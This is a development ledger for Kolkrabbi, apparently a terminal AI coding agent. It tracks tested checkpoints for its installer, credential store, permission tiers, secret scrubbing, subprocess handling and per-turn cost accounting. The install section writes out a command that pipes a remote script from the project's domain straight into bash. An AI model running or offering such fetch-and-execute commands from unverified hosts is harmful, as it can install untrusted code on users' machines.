# Kolkrabbi build checkpoints

This is the implementation ledger. [`PLAN.md`](PLAN.md) owns product decisions; this file owns
the order in which those decisions become tested code. Only one checkpoint may be active at a
time. A later checkpoint may be researched, but it may not change production code until the active
checkpoint is closed.

## Checkpoint contract

Every checkpoint is small enough to review and revert independently and follows the same gates:

1. **Scope:** name one observable behavior and list explicit non-goals.
2. **Red:** add the smallest test that fails for the intended reason; record the failure.
3. **Green:** implement only enough to satisfy that test.
4. **Refactor:** remove duplication and improve names without changing behavior.
5. **Focused verification:** run the changed package's tests, including the race detector when the
   checkpoint contains concurrency.
6. **Repository verification:** run `make fmt-check`, `make vet`, `./scripts/test.sh`, architecture,
   purity, build-tag, and budget gates. Use `./scripts/test.sh`, never bare `go test ./...`.
7. **Record:** add the result and reproducible commands to [`docs/build-log.md`](docs/build-log.md).
8. **Walk back:** if this checkpoint *removed* or *replaced* anything — a flag, a command, a type, a
   decision — search this file and PLAN.md for what still promises it, and mark those entries
   superseded, naming this checkpoint. Every other gate writes forward; this is the only one that
   looks behind.

A checkpoint is not complete merely because production code compiles. All eight gates must close.
Unrelated dirty files are user-owned and remain untouched.

Status: `[ ]` queued · `[~]` active · `[x]` verified · `[!]` blocked

Gate 8 was added on 2026-08-27 after an audit found four entries promising things that had been
removed: U0.1 offering `/yolo` compatibility after E13.2 deleted it, PLAN item 24 listing work that
B12.9 and P11.7 had shipped, the A12 group promising a SQLite store after item 17's measurement
refused it, and the phase table describing four phases as queued or building after their leaves
closed. Each was written correctly at the time; nothing brought the news.

A mechanical check was tried and rejected. Scanning leaf headlines for `/commands` and `--flags` that
no longer exist in the tree flags exactly the entries that *do* record a removal — "`--yolo` is gone",
"`--bare` forbidden" — while missing the ones that matter, whose claims sit on continuation lines.
Distinguishing "promises this exists" from "records this was removed" is semantic, not textual. So
this stays a step a person takes, and is written into the contract rather than left to memory.

## Current baseline

- Branch: `main` at `40226f1` when this ledger was created (2026-08-23).
- Full offline suite: **197 tests**, green with `./scripts/test.sh`.
- The repository has active uncommitted drafts for plan items 6 and 18. They are preserved, but
  neither authorizes implementation ahead of the migration checkpoints below.
- Architecture migration steps 0, 1, 3, 4, and 5 are complete. Step 2 is intentionally partial
  until Windows becomes required.

## Owner trial gate — notify immediately when this is green

This is the first milestone the owner can try as an installed product. It intentionally comes
before the dashboard, desktop client, and later architecture work.

```console
$ curl -fsSL https://kolkrabbi.francomichetti.com/install.sh | bash
$ kolk
kolk needs an API key before it can use models.
Add one:  kolk key <API_KEY>
Then run: kolk
```

- [x] the exact install URL returns a reviewed script over HTTPS.
- [x] the script selects the correct signed/checksummed release for macOS or Linux and installs
  `kolk` on `PATH` without requiring Go or another runtime.
- [x] `kolk` from a clean shell launches the installed binary — owner-confirmed clean-machine proof
  on 2026-09-01.
- [x] the domain root serves the reviewed purple retro-octopus landing page.
- [x] first launch without a key shows the short guidance above, never a stack trace or config-file
  instruction.
- [x] `kolk key <API_KEY>` infers the supported provider, stores the key with safe permissions, and
  never echoes the full value.
- [x] the next `kolk` starts a working model session with computed defaults.
- [x] a clean-machine smoke test proves the entire flow end to end — owner-confirmed install,
  provider setup, and first response on 2026-09-01.

When all eight boxes are green, stop and tell the owner that the app is ready to try, with the exact
commands and any currently supported platform limits.

Delivery order for this gate, each as its own TDD checkpoint after L0.8:

- [x] **T0.1 credential store** — lock + atomic file + non-printable secret become the `0600`
  provider-key manifest.
- [x] **T0.2 key command** — `kolk key <API_KEY>` inference, verification, redaction, and recovery.
- [x] **W0.1 landing site** — owner-requested static Omarchy-inspired page, original purple
  retro-octopus identity, and Cloudflare Pages deployment contract.
- [x] **T0.3 first-run path** — `kolk` without a key prints the three-line guidance; with a key it
  enters a working session using computed defaults.
- [x] **R0.1 v0.1 two-mode surface** — ship only chat and code, with code as the default; keep the
  experimental orchestrator unreachable until the later agentic phase.
- [x] **R0.2 agentic surface restoration** — at the owner's direction, expose the preserved
  sequential agent orchestrator as the third mode while keeping code as the default.
- [x] **T0.4 release and installer** — the public release, signed assets, no-store website installer,
  and independent live verifier are green.
- [x] **T0.5 clean-machine rehearsal** — owner confirmed the clean-machine install, first run,
  provider setup, and first model response on 2026-09-01. V34.5b owns the durable transcript link;
  repository-local release gates are recorded separately.
- [x] **R1.1 v1.1.0 installer-upgrade release** — publish the owner-requested three-part SemVer
  release, verify all signed assets and latest-version discovery, then exercise the public installer
  over an existing v0.1.0 installation.
- [x] **R1.2 v1.2.0 capability release** — publish the 74 commits since v1.1.14 as one minor
  release, and bring the public capability catalog back in line with what the binary does.
- [x] **U0.1 explicit auto-approve command** — add a discoverable, session-only
  `/auto-approve [on|off]` control while preserving `-y` and `/yolo` compatibility.
  **Half superseded 2026-08-27 by E13.2**: `/auto-approve` survives as one of three tiers, but
  `-y` and `/yolo` were removed and no longer exist to be compatible with. The `Agent.Yolo` field
  this leaf toggled is gone too, replaced by `Permission` plus a floor no tier can cross.
- [x] **U0.1b mode-prefixed prompt** — identify Kolkrabbi and the active mode as `kolk-<mode>`
  at every interactive prompt.
- [x] **U0.1c in-session model catalog** — make bare `/model` show the current selection and the
  available provider models while preserving `/model <id>` as the direct switch.
- [x] **U0.1d resilient agent completion** — recover once from an empty provider response, strengthen
  project-execution instructions, and make process-local auto-approve scope unmistakable.
- [x] **U0.1e bounded rate-limit recovery** — classify pre-stream provider HTTP failures and retry a
  temporary `429` without hiding cancellation, changing models, or silently spending money.
- [x] **U0.2a update identity and discovery** — strictly resolve stable versions, supported release
  targets, archive identity, and the exact GitHub latest-tag redirect without filesystem mutation.
- [x] **U0.2b bounded artifact verification** — download and validate the checksum manifest and
  exact release archive entirely before exposing binary bytes.
- [x] **U0.2c atomic executable replacement** — preserve the running executable on every failure and
  replace it atomically with the verified binary at mode `0755`.
- [x] **U0.2d update command surfaces** — wire the shared updater into keyless `kolk update` and
  non-fatal in-session `/update` with exact help and restart guidance.
- [x] **U0.3 loading octopus** — show a TTY-only animated octopus while Kolkrabbi is waiting,
  without corrupting streamed replies, redirected output, or cancellation.
- [x] **U0.3a provider-wait lifecycle** — expose one context-owned, exactly-once activity seam around
  every logical engine model call without changing terminal output.
- [x] **U0.3b TTY octopus renderer** — implement the purple animated status against U0.3a with a fake
  clock and strict terminal-only activation.
- [x] **U0.3c terminal-compatible octopus hotfix** — keep every animation frame in one saved
  terminal region on Apple Terminal and publish the independently verified `v1.1.1` patch.
- [x] **U0.4 persistent terminal UI** — add a Codex-style persistent multiline input area, live
  activity/tool status, visible model/mode/effort/session state, and robust terminal interaction.
- [x] **U0.4e spinner-only free-default patch** — remove loader decoration, dynamically prefer a
  free coding model, retire the stale documented free preset, and publish the verified `v1.1.3`.
- [x] **U0.4f bounded background-output hotfix** — prevent a successful shell whose intentional
  background process retains stdout from freezing the agent turn; publish verified `v1.1.4`.
- [x] **U0.4g persistent purple composer** — replace the boxed prototype with a stable text-only
  purple TUI, fix raw-terminal row displacement, and prepare the verified `v1.1.5` patch.
- [x] **E7.1 effort vocabulary normalization & canonical levels** — canonical `low/medium/high/max` with numeric `1..4` and legacy `quick..ultra` aliases.
- [x] **E7.2 effort knob matrix** — wire tool round limits, subagent width, and bash timeouts to active effort.
- [x] **E7.3 config & tier resolution** — wire `effort.<level>.model` into config and tier inheritance.
- [x] **E7.4 interactive REPL & slash surface** — live `/effort <level|num>` with immediate model re-resolution and status line updates.
- [x] **M8.1 catalog cache & discovery seam** — disk-cached catalog loader with 1-hour TTL and seed fallback.
- [x] **M8.2 free model ranker & auto-rotation** — free model intelligence ranking and per-turn 429 rotation.
- [x] **M8.3 model aliases & catalog browser** — vendor aliases (`sonnet`, `haiku`, `flash`, etc.) and bare `/model`.
- [x] **M8.4 fast lane auxiliary execution slot** — isolated zero-cost `slot.fast` for titling and summarization.
- [x] **C9.1 unified command table & parity engine** — single source of truth for CLI flags and REPL slash routing.
- [x] **C9.2 short verbs & grammar simplification** — <= 6 character verbs (`key`, `model`, `effort`, `mode`, `config`).
- [x] **C9.3 non-interactive scripting & stream-json** — `--output stream-json` and strict UNIX exit codes.
- [x] **C9.4 shell completion generator** — dynamic autocompletions for bash, zsh, and fish.
- [x] **S10.1 saga state machine & artifact engine** — `SAGA.md` parser, generator, and chapter lifecycle state machine.
- [x] **S10.2 quality gate & git checkpointer** — automated test discovery, verification execution, and commit-on-green.
- [x] **S10.3 budget & doom-loop guardrails** — chapter limit, dollar budget, timeout, and consecutive failure detection.
- [x] **S10.4 CLI & slash command surface** — `kolk saga [goal|resume|status|stop|rewind]` and REPL twin `/saga`.
- [x] **S10.8 the next-chapter planner** — the saga decides one chapter at a time from what the last one achieved, as the doc's napkin test shows.
- [x] **X6 the dead-export backlog** — twelve deleted, four kept with reasons that name what they are waiting for; nothing says "untriaged".
- [x] **S10.11 the repair turn** — a chapter whose gates fail gets one attempt to fix itself before its work is discarded, as the doc specifies.
- [x] **S10.10 the provider guard, everywhere and pinned** — every package audited for the same gap, the guard applied independently of directory isolation, and the property itself under test.
- [x] **S10.9 the test suite cannot reach a provider** — isolation is no longer something a test can forget, and a stray call now hits a closed port instead of the real API.
- [x] **S10.7 resume is the resume anchor** — `kolk saga resume` works the chapters instead of saying the loop is unwired, which stopped being true the moment S10.6 landed.
- [x] **S10.6 the chapter executor** — `kolk saga run` walks the chapters: work, verify, record, repeat until a budget stops it.
- [x] **S10.5 saga artifact ownership & honest subcommands** — `SAGA.md` belongs to the project root, and `resume`/`stop`/`rewind` report the real saga instead of always denying one.
- [x] **P11.1 provider plan registry & search** — static plan matrix with case-insensitive filtering behind `kolk plans` / `/plans`.
- [x] **P11.2 credential-free connector manifest** — versioned `connectors.json` with atomic, locked upsert and no credential fields.
- [x] **P11.3 plan model catalog** — `kolk pmodels` / `/pmodels` list provider, plan, connector, model, effort levels, and access status.
- [x] **P11.4 provider-owned login handoff** — `shell.Handover` attaches the provider CLI to the real terminal; Kolk never sees credentials.
- [x] **P11.5 live plan login picker** — `/plogin` filters and completes plans while typing, mirroring `/model`.
- [x] **P11.6 terminal ownership around provider login** — a provider CLI is never spawned while Kolkrabbi owns the keyboard; in-session logins hand the user the exact command for a separate terminal.
- [x] **B12.1 Claude CLI invocation contract** — safe argv construction, prompt only over stdin, `--bare` forbidden.
- [x] **B12.2 Claude stream translation** — allow-listed NDJSON frame projection with scrubbed text and tool input.
- [x] **B12.3 provider-neutral result adapter** — translated events become `provider.Message` and `provider.Meta`.
- [x] **B12.4 engine chat backend seam** — `engine.ChatBackend` with the OpenRouter client as the unchanged default.
- [x] **B12.5 persistent Claude session** — one line-framed child process serves every turn of a Kolk session.
- [x] **B12.6 backend lifecycle ownership** — the CLI session opens and closes the Claude backend exactly once.
- [x] **B12.7 session-scoped process lifetime** — the persistent provider process belongs to the Kolkrabbi session, and a line process reports its exit repeatably instead of blocking.
- [x] **B12.8 interrupted-turn recovery** — an abandoned turn's frames never reach the next turn, an unrecoverable stream is replaced, and a provider that quits mid-turn says why.
- [x] **B12.9 connector-to-backend selection** — an enabled connector actually chooses the provider that answers a turn, and an unusable plan model refuses with its reason.
- [x] **B12.10 live provider switch** — `/model` onto or off a plan model moves the provider with it and releases the one it retires.
- [x] **B12.11 per-turn accounting** — a session turn records its own cost and tokens, not the provider's running totals, and no longer records zero.
  **Amended 2026-08-29 by S10.1d6**: this held only for turns that *completed*. An abandoned turn
  never charged, so it recorded zero and left the running totals stale — and the next turn was
  billed for both. The claim is true on every path now, not just the happy one.
- [x] **P11.7a honest login state** — a clean provider exit records the connector as `unverified` and says what it does and does not prove.
- [x] **P11.7b verify on first use** — the first answered turn confirms the connector; a failed turn on an unverified one explains the likely cause once and changes nothing.
- [x] **B12.12 effort within the plan** — an effort a plan does not offer steps down and says so, and `/effort` reports what the running provider is actually using.
- [x] **B12.13 subscription-only first run** — the owner's decision was recorded 2026-08-28 and its four
  leaves B12.13a–d all closed; see "B12.13 first run without an OpenRouter key" below. Dropping the key
  requirement outright was rejected: the order is free first, subscription when there is one, free again
  when there is not. Tick corrected 2026-08-28 — the leaves closed and nothing brought the news here.
- [x] **B12.14 cache token accounting** — cache tokens reach `provider.Meta`, the call record and `stats.jsonl`, from both the Claude adapter and OpenRouter, and are diffed per turn like the rest.
- [x] **L13.1 managed local storage paths** — a Kolk-owned model directory under the data dir, never a host Ollama path.
- [x] **L13.2 managed runtime spec & lifecycle** — validated `RuntimeSpec`, start-at-most-once, deterministic close.
- [x] **L13.3 managed sidecar starter** — `shell.StartManagedProcess` keeps process execution inside the one owner package.
- [x] **L13.4a hardware snapshot & fit planner** — the documented probe-independent shape, reserved headroom, and a refusal that carries the numbers behind it.
- [x] **L13.4b sysfs and meminfo probe** — the snapshot is filled from platform metadata through injectable seams, failing closed to unknown.
- [x] **L13.4c disk space and NVIDIA VRAM** — `internal/diskspace` measures free space per platform, NVIDIA cards are measured through the vendor tool, and `NewSystemProber` wires both.
- [x] **L13.5a `localia` status** — `kolk localia` and `/localia` report hardware, managed storage, and installed local models, and pull nothing.
- [x] **L13.5b1 catalog and plan** — `localia models` lists what can be planned for, `localia plan <model>` shows every number the decision rested on and downloads nothing.
- [x] **L13.5b2 pull approval** — `localia pull` plans, asks, and treats anything but an explicit yes as no.
- [x] **L13.5b3 verified runtime install** — the install path is built and tested; it refuses to run without a pinned checksum, and this build pins none.
- [x] **C12.1 context accounting** — the window is measured from provider-reported tokens, shown in the per-turn footer, and unknown never means small.
- [x] **C12.2a compaction transform** — the pure shrink: tool output first, then the calls, then a summary, always leaving a conversation a provider will accept.
- [x] **C12.2b compaction in the turn loop** — fires at a turn boundary, keeps the replaced conversation for undo, and says out loud what it gave up.
- [x] **C12.2c overflow recovery and `/compact`** — a refusal for length is recovered once instead of losing the turn, and `/compact` / `/compact undo` put the control in the user's hands.
- [x] **C12.3 session commands** — `sessions search|rename|fork|export`, with a mistyped id reported as the ordinary mistake it is.
- [x] **C12.4 project-aware resume** — `kolk -r` resumes the work done in this directory, and says so when it reaches into another project.
- [x] **C12.5 memory layers and `/remember`** — a user layer beneath the project file, capped at a line boundary, written only when the user says so.
- [x] **C12.6 durable compaction archive** — the replaced conversation survives the process, and deleting a session deletes it too.
- [x] **D17.1 resilient usage log** — one unreadable line costs one line, not a history, and incomplete totals say they are incomplete.
- [x] **D17.2 `kolk dash`** — a loopback-only dashboard rendered entirely on the server, with no script, no assets and no network.
- [x] **D17.3 effort folding & recent sessions** — one effort level is one row whatever it was called when it was recorded, and sessions are listed with what each cost.
- [x] **R1 session-safety review** — every command added this session was re-checked against the one rule the session's own bugs kept teaching: nothing may take the keyboard or block the turn.
- [x] **R2 test isolation and stdin ownership** — the suite no longer writes into the developer's own Kolkrabbi state, and `/key -` no longer competes for the keyboard.
- [x] **R3 rune-safe tool output** — the hottest truncation in the product no longer splits a UTF-8 rune, and the tests that missed it were vacuous by arithmetic.
- [x] **R4 warnings reach the screen that owns it** — engine warnings no longer bypass the terminal renderer, and a restore that could not be saved says so.
- [x] **E13.1 path confinement** — file tools resolve against the project root, symlinks first, and reaching outside asks; in full-auto it proceeds and is logged with the reason.
- [x] **E13.2 permission tiers** — `--yolo` is gone; `/ask`, `/auto-approve`, `/full-auto` and `/permissions` are the whole model, and no tier removes the floor.
- [x] **E13.3 scrubbed tool output** — every tool result is scrubbed at one chokepoint, and the scrubber now catches vendor-less secrets.
- [x] **E13.4 subagent auto-deny** — orchestrated work never prompts; anything its tier would ask about is refused with the way to allow it.
- [x] **E13.5 readable output** — binaries are described rather than sent, and a large file says how to page through the rest.
- [x] **E13.6 permission rules with scopes** — `allow bash(git *)` and friends, last match wins, kept for this session, this project, or everywhere.
- [x] **G16.3 project hooks are shown before they run** — every command listed together, approval keyed by content so an edit cannot inherit an old yes.
- [x] **G16.2 hook events and the confirmation** — a hook is a shell command somebody agreed to once, bounded, scrubbed, and unable to fail the edit it followed.
- [x] **G16.1 markdown commands** — a file in a directory becomes a slash command, and it cannot become one that already exists.
- [x] **G16.4 `mcp(...)` permission rules** — a server's tools become governable by prefix, and the widest rule stops quietly excluding them.
- [x] **G16.5 tool schemas stop being free** — measured at 2,816 bytes, bounded by a failing budget, and reported by `kolk doctor`; the doc's estimate was nearly double.
- [x] **I27.6 the view** — the dash renders the cards, blocked first, and a prediction I27.4 made about the catalogue turned out to be false.
- [x] **I29.1 listening-port discovery** — a `bash` call that starts a server says where it is, and only a loopback port gets a link.
- [x] **I28.3 `/pr` drafts and hands over** — item 28 is complete; three copies of shell quoting became one on the way.
- [x] **I28.2 `/commit` drafts and stops** — the message, the command that would use it, and the plain statement that nothing was committed.
- [x] **I28.1 dirty-tree awareness** — a turn knows which files are uncommitted before it advises about them, and it is told beside the turn rather than in the system prompt.
- [x] **I27.4 cost per card, and context refused** — cost is a number people act on; a raw token count without its window is not.
- [x] **I27.3 blocked cards** — a session waiting on a prompt has stopped, and the listing says so; the tail read was measured and made 17× cheaper before it shipped.
- [x] **I27.5 a shared checkout says so** — two live sessions in one directory is a thing people do on purpose and a thing they should be told once.
- [x] **I26.7b the route, and what it refuses** — token, steer tier, the command's own rules, and an honest 501 where there is no session to ask.
- [x] **I26.7a the `turn.start` command** — the protocol half of letting a paired device ask for something rather than only watch.
- [x] **L21.2 `--debug`** — off unless asked, scrubbed on the way in, and it names its own file at the end.
- [x] **L21.1 `kolk doctor`** — prints what it found, never what it found with.
- [x] **L21.3 fuzzing where third-party bytes become control flow** — the SSE reader and tool dispatch, with invariants rather than "does not panic".
- [x] **L30.3 one vocabulary for one failure** — the turn-level stop and the saga's chapter-level stop share a phrase that a test keeps shared.
- [x] **L30.2 who is there to ask decides what happens** — the call is never made a third time; the tier decides whether that means a question, a stop, or a refusal.
- [x] **L30.4 the ceiling is no longer the detector** — a repeated call stops on the third round, not the fifty-first.
- [x] **L30.1 the doom-loop detector** — three identical calls with identical results are a loop; either half differing is progress.
- [x] **L32.5 a snapshot store is visible and mortal** — `kolk sessions` shows what it costs, and deleting the session deletes it.
- [x] **L32.4 the user's git is untouched, permanently** — closed by the snapshot and rewind guards rather than a third test.
- [x] **L32.3 `/undo` finally covers what `bash` did** — a rewind restores the whole tree to the turn's opening snapshot, and the manifest says which store captured each turn.
- [x] **L32.2 which store captures a turn** — a repository gets whole-tree snapshots, everything else gets copies, and a store that breaks mid-session says so once and stops trying.
- [x] **L32.1 the shadow store** — a git object store outside the work tree, so a change made by `bash` is visible and the user's own repository is never written to.
- [x] **L21.4 every action is pinned by commit SHA** — a tag is whatever that account publishes next, which is a credential decision wearing a version number.
- [x] **L31.1 the driver list grew by evidence, not by import** — approving `goreleaser check` must not write a rule that allows `goreleaser release`.
- [x] **L19.2 three platform claims corrected** — `desktop/`, `bind/` and `tools/` were never carved, and SQLite was never added.
- [x] **L19.1 the third-party allowance list cannot rot** — an allowance nothing imports fails the build, because a budget that pre-approves what nobody asked for is not a budget.
- [x] **L23.2 the README carries the refusals** — someone deciding whether to use kolk needs the non-goals more than the phases.
- [x] **L23.1 the plan's bookkeeping is checked** — a tick must have the document it claims, and the document must not claim more than the tick.
- [x] **L22.2 documentation cannot describe what does not exist** — the README's commands and the welcome's slash commands are checked against the tables that define them.
- [x] **L22.1 a new session is told the dials turn** — the status line shows mode, effort and model; nothing said they could be changed mid-conversation.
- [x] **L21.0 the error matrix is code, not a table** — every provider failure arrives with a next action, at all three places a turn can fail.
- [x] **L20.1 the weekly live smoke test** — the one test that is allowed to cost money: opt-in, fork-proof, never on a push, and pinned to the free model the offline catalogue promises.
- [x] **L20.2 the install section says how people actually install** — three paths instead of one, and the one that was there could not have worked.
- [x] **I27.2 the session overview** — a card list that can be polled: header-only reads, liveness that neither steals nor creates a lock.
- [x] **I27.1 a session says it is running** — an advisory lock, so liveness is observed rather than reported.
- [x] **I26.6 read and steer tiers** — a device token means less than the operator's, and the store no longer races.
- [x] **I26.5 reachability** — `kolk serve` says how to reach it and who else can, Tailscale first.
- [x] **I26.4 pairing** — a six-digit code, armed briefly, single use, attempt-capped, on a route that does not exist the rest of the time.
- [x] **I26.3 the device store** — one token per device, stored only as a hash, revocable one at a time.
- [x] **I26.2 the protected surface, ratcheted** — every route needs the token except two that say nothing, and widening that set now fails a test.
- [x] **I26.1 the bind floor** — a wildcard address is not loopback, and the refusal happens before the socket opens.
- [x] **X3 a long path is elided in the middle, not the end** — the filename is the part a person needs, and it was the part being cut.
- [x] **X2 the reported path is the resolved path, on every platform** — a macOS-only break I shipped, and the Linux test that would have caught it.
- [x] **X1 fixtures that do not look like live keys** — the scrubber's own test corpus was blocking every push; fixtures now match the repository's existing shorter shape.
- [x] **G15.3 plan mode** — `/plan` is read-only built out of permission rules, not a second permission system.
- [x] **G15.2 `/diff`** — the session's own changes as diffs, measured from where the session started.
- [x] **G15.1 `/undo`** — one turn, both halves; files and conversation never move independently.
- [x] **G11.3 context and cost in the status line** — the two numbers that decide whether to compact or stop, where someone is already looking.
- [x] **G11.2 `@file` mentions** — `@` completes against the project, path not contents, ignoring what `.gitignore` and a skip list say to.
- [x] **G11.1 diff preview before confirm** — an edit or a write shows the change, a create is visibly not an overwrite, and the overlay renders it line by line.
- [x] **F14.6 the orchestrator slot reaches the orchestrator** — the planner and synthesis take the slot when set, instead of it only affecting `design` tasks.
- [x] **F14.5 concurrency** — independent readers run three at a time over the dependency graph; anything that may write is serialised, and each task's output arrives whole.
- [x] **F14.4 cost is visible and capped** — a run shows what it has spent as it goes and stops at an optional ceiling rather than refusing.
- [x] **F14.3 routing** — a task's kind resolves to a named slot, the slot to a model, printed with the plan before anything runs.
- [x] **F14.2 a run survives its failures** — a failed task is reported rather than discarding the whole run, and the answer says what is missing from it.
- [x] **F14.1 tasks carry structure** — a plan is records with a kind and real dependencies, and a subagent is briefed with only the results it asked for.
- [x] **E13.7 "always" means a rule you can read** — the prompt proposes the rule it would keep, in both the TUI and the plain REPL, and keeps it where /permissions can show it.
- [x] **C12.7 fast-lane session naming** — a session earns a real name once enough has happened, without delaying the answer or overwriting a name a person chose.
- [x] **L13.5b4 / L13.5b4a runtime pin proposal** — **superseded by E10.** The E-group (E1–E11,
  merged 2026-08-28) pivoted local models from a kolk-managed sidecar to the user's own Ollama on
  PATH. `pinnedRuntime` and `InstallRuntime` were deleted by E10; the `L13.6` group that depended
  on them was retired. These two checkpoints, asking the owner to choose an upstream build for a
  deleted install path, can now only never be satisfied. Marked closed, superseded.
- [x] **L13.5c GPU and quantization settings** — the five local settings live in the existing config surface, validated where they are typed and shown by `localia`.
- [x] **S10 codex spawn backend** — `codex exec --json` becomes a kolk backend, with the model and
  effort dials working inside the subscription. Written 2026-08-28, gates closed 2026-08-29 by a
  later session that found two real lint defects in it. See "S10 closed" below.
- [x] **S10.1a fixture provenance corrected** — §10.1's A1–A4 checked against the committed bytes
  and written into `spec/testdata/foreign/README.md`: the tool is `Bash` not `Write`, both
  `claude-*` files are **tolerance** fixtures carrying `permissionMode:"auto"` and eight hook
  frames, and the `␊` in `tool_result.content` is a capture-time redaction artifact that no test
  may assert. Verified while recording it: nothing in `internal/secret` or `internal/redact` maps
  U+240A, so production `Scrub` never had this defect.
- [x] **S10.2 the captured stream is replayed, and the limit frame it carries is finally read** —
  the fixtures existed to be replayed and nothing replayed them, which hid a live bug. See below.
- [x] **S10.1c the capture script, and the fixture the captures cannot carry** —
  `scripts/capture-foreign.sh` writes argv verbatim beside every capture and redacts through `jq`,
  so control characters survive; `spec/testdata/foreign/synthetic/control-characters.ndjson` pins
  the contract the committed captures corrupted. See below.
- [x] **S10.1d1 the stderr ring** — S2's bounded stderr, and the two defects an unbounded buffer
  was carrying. See below.
- [~] **S10.1d2 the rest of S2's L0** — re-checked against the tree 2026-08-29, because the previous
  wording of this entry was written from intent rather than evidence and got two things wrong.
  **Done:** the process group and group-directed cancel (S10.1d2), the SIGINT-first ladder
  (S10.1d3), the drain that keeps its accounting (S10.1d6), and async `EPIPE`-tolerant stdin
  (S10.1d7). **Genuinely still open, verified by reading it:**
  - **Closing the stdout read end after the ladder.** Not implemented, and it cannot be while
    `cmd.StdoutPipe()` owns the pipe: that read end is closed by `Wait`, and `Wait` may not run
    until every read has finished — which is precisely the case P6 describes, where a background
    `Bash` grandchild inherits the **write** end and EOF never arrives. Doing this properly means
    `os.Pipe()` and owning the read `*os.File`. The group kill from S10.1d2 **bounds** the symptom
    to `closeGrace` by killing whatever held the write end; it does not close the read end, and a
    grandchild that escaped the group with its own `setsid` would still hold it. An earlier note in
    this session claimed this was "probably covered" — it is not, and the correction is the reason
    this entry now cites line-level evidence rather than a recollection.
  - **P6's post-result drain does not exist.** Corrected 2026-08-29, replacing a claim in this very
    entry that it did and merely disagreed on its deadline. It does not, because P6's drain and
    `resyncGrace` are different mechanisms that this session read as one:
    - **P6's drain** runs after a *successful* `result`: do not kill, keep reading stdout **without
      translating** for ≤3 s, then walk the ladder, then close the read end. It exists because the
      vendor keeps flushing queued output for up to 30 s when the consumer is slow, so killing on
      sight of `result` **truncates large responses**. `Turn` returns the moment it sees the
      completion, so nothing drains and that truncation is live.
    - **`resyncGrace`** (5 s, `session.go:120`) runs after an *interrupted* turn, waiting for the
      tail so the next turn does not inherit stale frames. Different trigger, different purpose,
      correct as it stands.

    There is therefore no 3-vs-5 timeout question, and no owner decision here — only an unbuilt
    leaf. Recorded this way because "the deadline drifted" and "the feature is missing" send the
    next reader to entirely different places.
- [x] **S10.1d4 a hard exit retires the vendor conversation** — the dangerous half of §2.5's starred
  rule is closed. See below.
- [~] **S10.1d5 announcing a retired conversation** — **the user is now told, and told once; the
  typed code and the vendor-facing label are not built.** A retirement streams a trail line through
  the same channel `limitTrail` uses, and stays silent when the user cancelled the turn themselves.
  Still open: `WarnHistoryLost` as a **typed** warning rather than prose, which needs §2.6's
  amendment **A2** (`Warnings` riding an `EventResponseMeta` — `provider.Meta` has no warnings field
  at all today) and **A7** (the three `Warn*` codes). Also open, and deliberately: the
  `<prior-conversation>` prompt label.

- [x] **S10.1d6 a cancelled turn is accounted, and stops billing the next one** — the drain already
  read the vendor's terminal frame and discarded it. See below.
- [x] **S10.1d7 async stdin, so a dead child's own reason survives** — A6's write path. See below.

### S10.1d7 built — the pipe was reporting itself instead of the child

Amendment A6 asks for an asynchronous stdin write that ignores `EPIPE`, and the sentence explaining
why is the whole leaf: *"a 200 KB prompt against a child that exits on a bad flag blocks past the
64 KiB pipe buffer and reports 'broken pipe' as the cause, discarding the real diagnosis."*

This is a **diagnosis** bug, not a plumbing one. The child has already said exactly what is wrong —
`claude: unknown flag --nope` — and it is sitting in stderr waiting for the reader to collect it,
which the stderr ring (S10.1d1) now keeps bounded and the exit path now reports. But `Send` wrote
synchronously and returned first, so the turn failed with a symptom of the failure instead of the
failure, and the sentence the user needed was never printed.

**The write error is not returned at all, rather than ranked below the exit code.** A6 says it "may
never outrank the exit code + stderr in classification". Ranking implies a comparison someone has to
get right at every call site. Never producing the error removes the comparison: the reader owns
diagnosis, and a child that did not take this prompt is a child whose exit already says why.

**One writer goroutine, not one per `Send`.** This is a line-delimited protocol, so order is part of
the contract, and N goroutines racing on a pipe do not preserve it. A buffered channel with a single
consumer keeps sends FIFO while still letting `Send` return before the child has read anything.

**A malformed mutation is worth recording too.** The first attempt at reverting to synchronous
behaviour left a `select` whose only case was `<-p.exited`, so `Send` blocked forever against `cat`
and the run had to be killed. That is not evidence about the code — it is a broken experiment, and
counting it as a caught mutation would have been self-deception. Re-done properly, restoring the
exact pre-fix synchronous write fails the new test with the original `broken pipe` message.

Acceptance checklist:

- [x] red first, failing with the literal defect: `Send reported writing provider request: write |1:
  broken pipe`.
- [x] the prompt sized past the 64 KiB pipe buffer, since a small one fails fast and never
  reproduces the blocking half.
- [x] proven non-vacuous by a correctly-formed mutation after the first was thrown out as invalid.
- [x] `-race` green, including the new writer goroutine.
- [x] full `make check` green: **2,544 tests, 0 lint issues**.

### S10.1d6 built — the drain was reading the receipt and throwing it away

§2.5 starts the cancel ladder at SIGINT for one stated reason: the vendor still produces a `result`
frame, **so a cancelled turn is accounted rather than a hole in the dashboard**. Three leaves have
now been spent making that frame exist and arrive. `abandonTurn` was already draining it — and
dropping every byte on the floor. The benefit the whole ladder was built for was never collected.

**The second defect is worse, and is not about cancellation at all.** `chargeTurn` turns the
vendor's *running session totals* into one turn's delta by rebasing `s.spent*` on each report. An
abandoned turn that never charged left those totals stale, so the next turn's delta silently
included the abandoned turn's tokens and cost. A user who cancels a turn and immediately retries was
**billed for the cancelled one twice**: once invisibly, once inside the retry. B12.11 exists to
prevent precisely this, and cancellation walked straight around it — which is why B12.11's entry
above is amended rather than left reading as though it had always been true.

**What is deliberately *not* recovered: the partial message.** The drain collects only the
accounting. The turn still failed and still reports why; handing back half an answer as though it
were an answer is a different decision, belonging to §1.2's `Truncated` and A4's flattening rule,
and it is not made here.

**`Collect`'s own error is discarded on this path, on purpose.** The turn has already failed and
`cause` is the reason. A second error from parsing a stream that was interrupted mid-flight would
only replace a useful diagnosis with a symptom of it.

Acceptance checklist:

- [x] red first: the abandoned turn's meta printed empty, with the vendor's reported cost right
  there in the fixture.
- [x] the double-charge covered in the same test, since reporting the cancelled turn and *charging*
  it are separable and only one of them is visible in a meta.
- [x] proven non-vacuous by mutation: dropping `chargeTurn` alone still reports the cancelled turn
  correctly and bills the next one 0.8 instead of 0.3 — the exact double-billing, caught.
- [x] gate 8: B12.11's claim amended, because it read as unconditional and was not.
- [x] `-race` green; full `make check` green: **2,543 tests, 0 lint issues**.

### S10.1d5 (part) built — saying so, and knowing when not to

S10.1d4 made a retirement safe and left it **silent**. The vendor has lost its own record of the
session, later turns behave differently because of it, and nothing said a word.

**What the message says is the decision here.** §2.5 names the warning `WarnHistoryLost`, and taken
literally that is the wrong thing to tell this user: nothing of theirs was lost. `promptFromMessages`
